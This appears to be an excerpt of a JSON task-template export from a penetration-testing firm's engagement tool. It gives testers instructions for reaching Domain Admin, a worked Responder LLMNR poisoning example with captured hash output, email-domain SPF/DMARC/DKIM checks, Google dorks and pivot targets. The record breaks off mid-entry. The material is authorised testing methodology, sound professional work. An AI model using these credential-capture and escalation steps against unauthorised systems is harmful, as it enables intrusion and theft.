                        "taskInstructions": "<h2>Instructions</h2>\nThe goal of this objective is to illustrate impact. \n\n<h3><b>Critical Servers</b></h3>\n<ul><li>Domain controller</li>\n<li>Core application or web server</li>\n</ul>\n<h3><b>Critical Data Stores</b></h3>\n<ul><li>Database servers (structured data)</li>\n<li>File servers (unstructured data</li>\n</ul>\n<h3><b>Critical Data</b></h3>\n<ul><li>Regulated data: SSN, CCN, PHI, PII</li>\n<li>Investment strategies</li>\n<li>Mergers and acquisition data</li>\n<li>Internal earning reports</li>\n<li>&quot;Coke Formula&quot;</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Attack Narratives",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4241740-2af0-11ee-9217-6359d59b60b5",
                        "ordinal": 6,
                        "masterFindingId": null,
                        "taskInstructions": "When creating the Attack Narrative chapter of the InPen report, please map each step to the MITRE ATT&amp;CK framework (https://attack.mitre.org/) where possible. \n\nCommon MITRE Mappings can be found on Outline here: https://outline.netspi.com/doc/expen-mitre-mappings-j3UKV2EgNi\n\n<u>Below is an example Attack Narrative Summary structure:</u>\n\n<h3>4.1 Attack Narrative Summary</h3>\nBelow is a summary of the escalation path used during testing to obtain Domain Admin privileges and access sensitive data. Steps were mapped to the MITRE ATT&amp;CK framework where possible. \n<ol><li>T1110.003 - Credential Access: Brute Force - Password Spraying</li>\n<li>T1210 - Lateral Movement: Exploitation of Remote Services</li>\n<li>T1558 - Credential Access: Steal or Forge Kerberos Tickets</li>\n<li>T1069.002 - Discovery: Permissions Groups Discovery - Domain Groups</li>\n<li>T1555 - Credential Access: Credentials from Password Stores</li>\n<li>T1187 - Credential Access: Forced Authentication</li>\n<li>T1558 - Credential Access: Steal or Forge Kerberos Tickets</li>\n<li>T1003.006 - Credential Access: OS Credential Dumping - DCSync</li>\n<li>T1021.002 - Lateral Movement: Remote Services - SMB/Windows Admin Shares</li>\n<li>T1021.001 - Lateral Movement: Remote Services - Remote Desktop Protocol</li>\n</ol>\n<h3>4.2 Attack Narrative Details</h3>\nBelow is a detailed walkthrough of the escalation path used during testing to obtain Domain Admin privileges and access sensitive data.\n\n<b>T1110.003 - Credential Access: Brute Force - Password Spraying</b>\n\n1. NetSPI did this to gain this.\n<ncode>..code snippet or screenshot..\n</ncode>\n\n<b>T1210 - Lateral Movement: Exploitation of Remote Services</b>\n\n2. NetSPI completed another activity. \n<ncode>..code snippet or screenshot..\n</ncode>\n\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Obtain Domain Admin privileges",
                        "state": 3,
                        "comments": 0,
                        "uid": "c423286c-2af0-11ee-9212-577efd6735da",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nObtain Domain Admin privileges through privilege escalation techniques. The goal of this objective is to illustrate impact. Only one full domain escalation path showing impact is required for the attack narrative.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Complete all required tasks",
                        "state": 2,
                        "comments": 0,
                        "uid": "c4236ffc-2af0-11ee-9215-934305e2cb32",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\n<ul><li>Complete all tasks not labeled as &quot;[OPTIONAL]&quot; or in a &quot;Options&quot; task category.  </li>\n<li>All tasks labeled as &quot;[SM]&quot; should be automatically completed by the standard &quot;External Penetration Test&quot; work flow in Scan Monster. Once the scan is complete, those items can be changed to complete. You do not have to execute them manually. </li>\n<li>All tasks labeled as &quot;[ASM]&quot; should be automatically completed by the standard &quot;External Penetration Test&quot; work flow in ASM. Once the scan is complete, those items can be changed to complete. You do not have to execute them manually.</li>\n<li>For all high severity vulnerabilities, attempt to drive all vulnerabilities to command execution for the sample verification. Only one full domain escalation path showing impact is required for the attack narrative.</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Adhere to Verification Guidelines",
                        "state": 2,
                        "comments": 0,
                        "uid": "c423571a-2af0-11ee-9214-6bdc3f5ec2d7",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nAll medium and above severity findings should have at least one verification item.\n\n1. Each scenario and escalation path should be documented in a single verification item.\n\n2. Each title should begin with the IP address, and be followed by a full sentence ending in a period that includes a description of the step being taken. Ensure relevant usernames, systems, and tools are referenced in the description.  \n\n3. Ensure each critical finding is pushed to command execution whenever possible.\n\n4. If you cannot exploit a critical vulnerability due to lack of exploit, availability concerns, or other reason, please note that in the verification so the client has that context.\n<ncode>     Example\n     This finding has been included as the result of automated scanning. At this time, exploit code has been published but was not executed as \n     a part of this assessment due to availability concerns. \n</ncode>\n5. If the findings results in direct unauthenticated read, write, or command execution on the target system, please mark the finding as an &quot;Entry Point&quot;. This should include all weak and default passwords.\n\n6. Rating adjustments must be approved by a Practice Director and/or practice lead.\n\n7. If there is an &quot;Unedited Master Finding&quot;, it may need to be adjusted or rewritten for your instance. Make sure these changed instances are pointed out to the person QAing your workspace and report by leaving an Untracked (&quot;hidden&quot;) comment in Resolve and/or messaging them directly on Slack.  They may also require correlation.\n\nBelow is an example of the format expectations:  \n\n<h3><b>Title Example</b></h3>\n192.168.1.1: It was possible to capture the 'domain.com\\user1' domain user's NetNTLMv2 password hash by spoofing LLMNR responses which lead to unauthorized local administrative access to workstation23.domain.com.\n\n<h3><b>Verification Example</b> </h3>\n1. Perform LLMNR poisoning to capture the NTLMv2 password hash for the domain.com\\user1 domain user.\n<ncode>┌──(root\uD83D\uDC80kali)-[~/Responder]\n└─<b>&#35; python Responder.py -I eth0 -r</b>Pv\n                                        \n[+] Generic Options:\n    Responder NIC              [eth0]\n    Responder IP               [192.168.25.123]\n    Challenge set              [random]\n    Don't Respond To Names     ['ISATAP']\n\n[+] Current Session Variables:\n    Responder Machine Name     [WIN-4U0L9TSPP9K]\n    Responder Domain Name      [H1J6.LOCAL]\n    Responder DCE-RPC Port     [46248]\n\n[+] Listening for events...\n<b>[TRUNCATED</b>]\n<b>[&#42;] [LLMNR]  Poisoned answer sent to workstation23.domain.com for name</b> dyfpcxqikbp\n<b>[Proxy-Auth] NTLMv2 Client   : workstation23.domain.com</b>\n<b><red>[Proxy-Auth] NTLMv2 Username : domain.com\\user</red></b><red>1</red>\n<b><red>[Proxy-Auth] NTLMv2 Hash     : user1::domain.com:bc4b1f8ef666e93e:E018ED[REDACTED]000000</red></b>0\n<b>[TRUNCATED</b>]\n</ncode>\n2. It was possible to crack the NetNTLMv2 password hash offline for the domain.com\\user1.\n\n3. The domain.com\\user1 credential could then be used to log into workstation23.domain.com as a local administrator.\n\n<b>[RDP LOGIN SCREEN SHOT HERE SHOWING USER AND IP/HOSTNAME]</b> \n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Gain unauthorized access sytems, apps, and data",
                        "state": 2,
                        "comments": 0,
                        "uid": "c42329ca-2af0-11ee-9213-6f7d121aab73",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nGain unauthorized access to systems, application functionality, and sensitive data. Try to drive all high impact vulnerabilities to code execution when possible. The goal of this objective is to illustrate impact.\n\n<h2>Read Access</h2>\nIn order to use read access as an entry point you'll need to find <b>authentication tokens</b>. Those include things like passwords, session cookies, and private keys. To increase your luck, research the OS and installed applications to determine where they store that type of information by default. Then, simply use the passwords, session cookies, or keys to login.\n\nVulnerabilities can potentially allow read access to:\n<ul><li>Memory</li>\n<li>File System</li>\n<li>Registry</li>\n<li>Database</li>\n</ul>\n<h3><b>Questions to ask yourself:</b></h3>\n<ol><li>What files and paths can I read from?</li>\n<li>Where does the OS and installed applications store credentials?</li>\n<li>Can I read privileged files (do I have root/administrator)?</li>\n<li>Can I read any authentication tokens?</li>\n<li>If yes, then how do I use them to login?</li>\n<li>If not, then write the finding up and move on.</li>\n</ol>\n<h2>Write Access</h2>\nIn order to use write access as an Entry Point you'll need to write code, content, or files to locations <b>where you can control their execution or inject an authentication token</b>.  \n\nVulnerabilities can potentially allow write access to the follow areas:\n<ul><li>Memory</li>\n<li>File System</li>\n<li>Registry</li>\n<li>Database</li>\n</ul>\nThere are primarily two scenarios you'll run into regarding file access, restricted and arbitrary write access. It can be used as a general example for the other areas.\n\n<h3><b>Restricted file write</b></h3>\nThe vulnerability provides write access to files, but it is restricted to a specific file or path.\n\n<h3><b>Arbitrary file write</b></h3>\nThe vulnerability provides write access any file or path. The only thing restricting write access to files in this scenario are the privileges of the acting user. In most cases that will be a service account of some kind. For example, the account running IIS may not have write access the all users startup directory.\n\n<h3><b>Questions to ask yourself</b></h3>\n<ol><li>What files and paths can I write to?</li>\n<li>Where are OS and application autorun locations?</li>\n<li>Do I have administrative write access?</li>\n<li>Can I write my own authentication tokens within the application or OS?</li>\n<li>If yes, then how do I use them to login?</li>\n<li>If not, then write the finding up and move on.</li>\n</ol>\n<h2>Remote Code Execution </h2>\nThese types of issues allow direct code execution within the context of the service account. This is typically a canned exploit or unauthorized access to functionality that is intended to execute commands or code.\n\nThe general guidance is find a safe reliable exploit to run. Review the verification instructions. If a vulnerability recommendation does not already exist make sure to get a second opinion before running as exploit.\n\nIf you are targeting existing functionality in an application, database, or operating system, then read the documentation for guidance.\n\n<h2>Credentialed Access</h2>\nAttempt to log into application and management interfaces that support the authentication method. Then attempt to pivot through that medium into the internal network zones. If MFA exists, take a little to time to understand if a bypass is possible via self-service portals or other options.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 12,
                "id": 350464,
                "name": "Vulnerability Enumeration: Manual Checks",
                "description": "Vulnerability Enumeration: Manual Checks",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "SMTP Domains - Identify Lack of SPF",
                        "state": 2,
                        "comments": 2,
                        "uid": "c4252ac2-2af0-11ee-921b-4f9c09fa879b",
                        "ordinal": 0,
                        "masterFindingId": 17058974,
                        "taskInstructions": "<h2>Instructions</h2>\nVerify SPF records exist for email domains, white listed IP ranges and domains cannot be hijacked.\nCheck for SPF records on domains being used for email to identify missed SPF records and interesting TXT records that could indicate the use of technologies that could be targeted in future attacks.\n\n<b>Important Notes</b>\n<ul><li>SPF records are a type of DNS TXT record.</li>\n<li>SPF records contains a list of internet servers allowed to send email for the domain.</li>\n<li>SPF records can include a &quot;soft fail&quot; (~all) to indicate that IPs sending email for the domain that are not on the list should be marked as SPAM.</li>\n<li>SPF records can include a hard fail (-all) to indicate that IPs sending email for the domain that are not on the list should be blocked.</li>\n<li>SPF records may point to another TXT record using the &quot;include:&quot; setting.</li>\n</ul>\nClients getting mail from your domain validate the servers using your SPF records. However, they don't have to honor it.\n<b>Note:</b> As an attacker if you can obtain access to SPF IPs or relay through them you can spoof email from the domain.\n\n<h2>Variation: dig</h2>\n1. Use dig to identify SPF records.\n<ncode><b>dig txt google.com +short\n\n</b><b><red>&quot;v=spf1 include:_spf.google.com ~all&quot;</red></b><b>\n</b>&quot;facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95&quot;\n&quot;apple-domain-verification=30afIBcvSuDV2PLX&quot;\n&quot;globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=&quot;\n&quot;docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e&quot;\n&quot;google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ&quot;\n&quot;MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB&quot;\n&quot;docusign=1b0a6754-49b1-4db5-8540-d2c12664b289&quot;\n&quot;google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o&quot;\n</ncode>\n<h2>Variation: checkdmarc</h2>\n1. Install checkdmarc.\n<ncode>pip install checkdmarc\n</ncode>\n2. Run checkdmarc against the target domain and use jq to filter for the SPF record.\n<ncode><b>checkdmarc google.com | jq '.spf.record'\n\n</b>&quot;v=spf1 include:_spf.google.com ~all&quot;\n</ncode>\n<h2>Variation: dnsrecon</h2>\n1. Run dnsrecon and review the returned records.\n<ncode><b>dnsrecon -d google.com\n\n</b>[&#42;] std: Performing General Enumeration against: google.com...\n[-] DNSSEC is not configured for google.com\n[&#42;]      SOA ns1.google.com 216.239.32.10\n[&#42;]      SOA ns1.google.com 2001:4860:4802:32::a\n[&#42;]      NS ns4.google.com 216.239.38.10\n[&#42;]      NS ns4.google.com 2001:4860:4802:38::a\n[&#42;]      NS ns3.google.com 216.239.36.10\n[&#42;]      NS ns3.google.com 2001:4860:4802:36::a\n[&#42;]      NS ns1.google.com 216.239.32.10\n[&#42;]      NS ns1.google.com 2001:4860:4802:32::a\n[&#42;]      NS ns2.google.com 216.239.34.10\n[&#42;]      NS ns2.google.com 2001:4860:4802:34::a\n[&#42;]      MX smtp.google.com 172.217.212.27\n[&#42;]      MX smtp.google.com 172.253.114.27\n[&#42;]      MX smtp.google.com 172.253.119.27\n[&#42;]      MX smtp.google.com 108.177.111.27\n[&#42;]      MX smtp.google.com 74.125.124.27\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c03::1a\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c22::1b\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c23::1a\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c14::1b\n[&#42;]      A google.com 142.250.191.174\n[&#42;]      AAAA google.com 2607:f8b0:4009:819::200e\n[&#42;]      <b>TXT google.com v=spf1 include:_spf.google.com ~all\n</b>[&#42;]      TXT google.com facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95\n[&#42;]      TXT google.com apple-domain-verification=30afIBcvSuDV2PLX\n[&#42;]      TXT google.com globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=\n[&#42;]      TXT google.com docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e\n[&#42;]      TXT google.com google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ\n[&#42;]      TXT google.com MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB\n[&#42;]      TXT google.com docusign=1b0a6754-49b1-4db5-8540-d2c12664b289\n[&#42;]      TXT google.com google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o\n[&#42;]      TXT _dmarc.google.com v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com\n<b>[TRUNCATED]</b>\n</ncode>\n<h2><b>Variation: nslookup</b></h2>\n1. Use nslookup and review the returned records.\n<ncode><b>nslookup -type=txt google.com\n\n</b>Server:         172.24.0.1\nAddress:        172.24.0.1&#35;53\n\nNon-authoritative answer:\ngoogle.com      text = <b>&quot;v=spf1 include:_spf.google.com ~all&quot;\n</b>google.com      text = &quot;facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95&quot;\ngoogle.com      text = &quot;apple-domain-verification=30afIBcvSuDV2PLX&quot;\ngoogle.com      text = &quot;globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=&quot;\ngoogle.com      text = &quot;docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e&quot;\ngoogle.com      text = &quot;google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ&quot;\ngoogle.com      text = &quot;MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB&quot;\ngoogle.com      text = &quot;docusign=1b0a6754-49b1-4db5-8540-d2c12664b289&quot;\ngoogle.com      text = &quot;google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o&quot;\n\nAuthoritative answers can be found from:\n</ncode>\n<h3>More Options:</h3>\nhttps://github.com/BishopFox/spoofcheck.git\n\n<h2>Reporting Requirements</h2>\n<ul><li>Follow up on any odd TXT records to determine if related service have vulnerabilities.</li>\n<li>Take a screen shot of the command and command output for the email domain that does not have an SPF record.</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "SMTP Domains - Identify Lack of DMARC",
                        "state": 2,
                        "comments": 2,
                        "uid": "c424938c-2af0-11ee-9219-2726ba8db5f5",
                        "ordinal": 1,
                        "masterFindingId": 17065129,
                        "taskInstructions": "<h2>Instructions</h2>\nDetermine if the SMTP domains lack DMAC records.  Refer to the linked finding instructions and add results to the verification.  \n\n<h3><b>Guidelines</b></h3>\n<ul><li>Managed and Federated domains that appear to be email domains, have SPF and MX records.</li>\n<li>Generally don't report on domains that don't have SPF and MX records unless you can verify its used for email.</li>\n<li>If its a default mx records like &quot;mail.domain.com&quot;, do some additional verification.</li>\n</ul>\n<h2>Variation: dig</h2>\n1. Use dig to identify DMARC records.\n<ncode><b>dig txt _dmarc.google.com +short</b>\n\n&quot;v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com&quot;\n</ncode>\n<h2>Variation: checkdmarc</h2>\n1. Install checkdmarc.\n<ncode>pip install checkdmarc\n</ncode>\n2. Run checkdmarc against the target domain and use jq to filter for the DMARC record.\n<ncode><b>checkdmarc google.com | jq '.dmarc.record'</b>\n\n&quot;v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com&quot;\n</ncode>\n<h2>Variation: dnsrecon</h2>\n1. Run dnsrecon and review the returned records.\n<ncode><b>dnsrecon -d google.com\n\n</b>[&#42;] std: Performing General Enumeration against: google.com...\n[-] DNSSEC is not configured for google.com\n[&#42;]      SOA ns1.google.com 216.239.32.10\n[&#42;]      SOA ns1.google.com 2001:4860:4802:32::a\n[&#42;]      NS ns4.google.com 216.239.38.10\n[&#42;]      NS ns4.google.com 2001:4860:4802:38::a\n[&#42;]      NS ns3.google.com 216.239.36.10\n[&#42;]      NS ns3.google.com 2001:4860:4802:36::a\n[&#42;]      NS ns1.google.com 216.239.32.10\n[&#42;]      NS ns1.google.com 2001:4860:4802:32::a\n[&#42;]      NS ns2.google.com 216.239.34.10\n[&#42;]      NS ns2.google.com 2001:4860:4802:34::a\n[&#42;]      MX smtp.google.com 172.217.212.27\n[&#42;]      MX smtp.google.com 172.253.114.27\n[&#42;]      MX smtp.google.com 172.253.119.27\n[&#42;]      MX smtp.google.com 108.177.111.27\n[&#42;]      MX smtp.google.com 74.125.124.27\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c03::1a\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c22::1b\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c23::1a\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c14::1b\n[&#42;]      A google.com 142.250.191.174\n[&#42;]      AAAA google.com 2607:f8b0:4009:819::200e\n[&#42;]      TXT google.com v=spf1 include:_spf.google.com ~all<b>\n</b>[&#42;]      TXT google.com facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95\n[&#42;]      TXT google.com apple-domain-verification=30afIBcvSuDV2PLX\n[&#42;]      TXT google.com globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=\n[&#42;]      TXT google.com docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e\n[&#42;]      TXT google.com google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ\n[&#42;]      TXT google.com MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB\n[&#42;]      TXT google.com docusign=1b0a6754-49b1-4db5-8540-d2c12664b289\n[&#42;]      TXT google.com google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o\n[&#42;]      <b><red>TXT _dmarc.google.com v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com</red></b>\n<b>[TRUNCATED]</b>\n</ncode>\n<h2><b>Variation: nslookup</b></h2>\n1. Use nslookup and review the returned records.\n<ncode><b>nslookup -type=txt _dmarc.google.com</b>\n\nServer:         172.24.0.1\nAddress:        172.24.0.1&#35;53\n\nNon-authoritative answer:\n_dmarc.google.com       text = &quot;v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com&quot;\n\nAuthoritative answers can be found from:\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Identify Potentially Vulnerable Pages via Google Dorking",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4246196-2af0-11ee-9218-4f8a61f1bd30",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nReview vulnerability scan results and web scraping results for potential targets.\n\n<h2>Variation: Manual</h2>\n1. Conduct Google dorking again primary client domains and web applications.\n<h3>Examples:</h3>\n<ncode>site: company.com filetype:wsdl\nsite: company.com filetype:svc\nsite: company.com filetype:asmx\n</ncode>\nAlso consider search for asp / PHP pages.\n<ncode>site: company.com filetype:asp\n</ncode>\n2. Attempt to connect to web services and access sensitive data and functionality.\n\n<h2><b>Reporting Requirements</b></h2>\nShow steps to find and exploit vulnerable web services.\nNote: We could really use some automation that does this check for all domains discovered and returns a list of web service targets.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "SMTP Domains - Identify Lack of DKIM",
                        "state": 2,
                        "comments": 1,
                        "uid": "c4255bd2-2af0-11ee-921c-1fd9af7e5e48",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nDetermine if the SMTP domains lack DKIM records. \n\n<h3><b>Guidelines</b></h3>\n<ul><li>Managed and Federated domains that appear to be email domains, have SPF and MX records.</li>\n<li>Generally don't report on domains that don't have SPF and MX records unless you can verify its used for email.</li>\n<li>If its a default mx records like &quot;mail.domain.com&quot;, do some additional verification.</li>\n</ul>\nTypically a DKIM signature will need to be retrieved from the email headers from an email obtained during communication with the client. Check the email properties in Outlook for the email header info and look for a DKIM signature such as the one below:\n<ncode>DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple;\n  <b><red>d=verisign.com</red></b>; l=32873; q=dns/txt; <b><red>s=VRSN</red></b>;\n  t=1601401722;\n  h=from:to:cc:date:message-id:mime-version:subject;\n  bh=DTKO5HVYiY/N1KPkn9sUNYVyX+W6YZtDm7HgsUwH0sQ=;\n  b=e62LEvcMxOzHAcOd7fMJ0MjZqxFLbtQIpmQV/NL4jIjTbkiXMZpPzkOL\n   gblFKfxLqsu3jRe7VrNWbFYwAA2GjGE9tdIiLfmkgXcgoeJpXHdBoQxbs\n   yphas/FcSCJksz7elGhJ1TMK9CBz+xYdmErC47g+t7X+SU1qtH1p+dxzx\n   O7kfrJmn3JHp+TWDxNln7zZ8ZXz91HcT90gj44TQOaw3govRV3kCCg33A\n   HevXc3gcycWRpsW2bjrTxeiTKSGaYcJmTivWXDdv1qETYrn/cTiLzwxpF\n   bWiURKYaXz7wLE1ZdQig63yurg8ZLU+4O6Sk9nZhv1qt44h03TYrdSuIi\n   g==;\n</ncode>\nThe values in the &quot;d&quot; (domain) and &quot;s&quot; (selector) fields of the signature can be used to perform a DNS lookup as shown below. The format for the DKIM record query is <ncode>&lt;selector&gt;._domainkey.&lt;domain&gt;</ncode>:\n<ncode><b>&#35; dig @1.1.1.1 txt </b><b><red>VRSN</red></b><b>._domainkey.</b><b><red>verisign.com</red></b>\n\n; &lt;&lt;&gt;&gt; DiG 9.16.6-Debian &lt;&lt;&gt;&gt; @1.1.1.1 txt VRSN._domainkey.verisign.com\n; (1 server found)\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 52638\n;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;VRSN._domainkey.verisign.com.  IN      TXT\n\n<b>;; ANSWER SECTION:</b>\n<b><red>VRSN._domainkey.verisign.com. 900 IN    TXT     &quot;v=DKIM1; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArGA05xRUv76X9YLzkPzPeilbCvyF/RctsgvpHYoJAMX94gWuJ+UE3rGLmIkrRAayZrDNUqEf3wBsTrilDEoJa2YZz1DbNUe5j657cpjf+rGGaMbs40BqEbnWq1eKOgXT1VcxnwS1UWO+EUV3S/s/+WVYz9TR+Jkjkc9gtLgKm4btf1O3hzeyZkw2iqWyytYvR3bWF699&quot; &quot;KMGbCxsrMgNDZ9U/7ddnY5Z8WD6TplDs9UM/oduzEG+JAH8jUEJqI4YRIHPN+iQGRQnVhAMRD7wJBkeZZUTWwvLTU08oWCXHRAiRw9Xlsfg0xVFBjwnAx8KtQcyMzZEwVCuq/POBp5I6MQIDAQAB;&quot;</red></b>\n\n;; Query time: 88 msec\n;; SERVER: 1.1.1.1&#35;53(1.1.1.1)\n;; WHEN: Mon Oct 05 16:20:18 CDT 2020\n;; MSG SIZE  rcvd: 475\n</ncode>\nLook for the DKIM TXT record to come back in the DNS response. If the client doesn't use DKIM, create a finding for it.\n\nIf you do not have emails from the client to inspect headers from, try to determine the mail provider through MX records and use a common selector for the provider. Below are some common selectors for a few email providers:\n\n<b>Google</b>\n    google\n<b>Microsoft</b>\n    selector1\n    selector2\n<b>Everlytic</b>\n    everlytickey1\n    everlytickey2\n    eversrv (OLD selector)\n<b>MailChimp / Mandrill</b>\n    k1\n<b>Global Micro </b>\n    mxvault\n<b>Hetzner</b>\n    dkim\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Identify Known Vulnerabilities Missed by Scanners",
                        "state": 3,
                        "comments": 0,
                        "uid": "c424ce92-2af0-11ee-921a-b7533e4e38e3",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\n1. Review vulnerability scan results and web scraping results for potential targets.\n2. Review sub components of web applications for vulnerable versions. If the web application uses open source software consider downloading and review the code (as time allows).\n<ul><li>Use cvedetails and exploit-db.com to search for know issues and exploits.  </li>\n<li>Google Dork: &quot;software version exploit&quot;</li>\n<li>Consider looking for magic bytes in java applications.</li>\n<li>Consider reversing ActiveX plug-ins.</li>\n<li>Command injection.</li>\n<li>Discover hidden content and files with a fuzzdb data, go buster, burp content discovery.</li>\n</ul>\n<h3>Reference</h3>\n<ncode>https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet\n</ncode>\n<h2><b>Reporting Requirements</b></h2>\nAdd finding for vulnerable version and show screenshot of version.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 16,
                "id": 350465,
                "name": "Post Exploitation: Direct Remote Access Options",
                "description": "The goal of this group of tasks is to provide guidence on where to use aquired Active Directory domain credentials in order pivot into restricted cloud and on premise enviornments.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "Cloud Services - Amazon/AWS",
                        "state": 3,
                        "comments": 0,
                        "uid": "c425c54a-2af0-11ee-9220-77015c934be0",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to identify Amazon/AWS services.\n\n<h2>Variation: Manual</h2>\n1. Attempt to log into the following URL to check for missing mfa.\n<ncode>https://signin.aws.amazon.com\n</ncode>\n<h3>Reference</h3>\nInclude shodan and censys.io to identify AWS use.\n\n<h3>Tools</h3>\nhttps://github.com/nccgroup/Scout2\nhttps://github.com/carnal0wnage/weirdAAL\nhttps://github.com/carnal0wnage/weirdAAL/wiki\nhttps://github.com/cyberark/SkyArk\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Single Factor CMS",
                        "state": 3,
                        "comments": 0,
                        "uid": "c425ebba-2af0-11ee-9222-57792294ff50",
                        "ordinal": 12,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nAttempt to login to CMS endpoints and determine if MFA is enabled. Target other management interfaces exposed to the internet that may accept domain credentials.\n\n<h3>Examples:</h3>\nJira\nConfluence\nDrupal\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Single Factor Office 365",
                        "state": 3,
                        "comments": 0,
                        "uid": "c426c878-2af0-11ee-9227-43ccc5ff3d38",
                        "ordinal": 10,
                        "masterFindingId": 17059065,
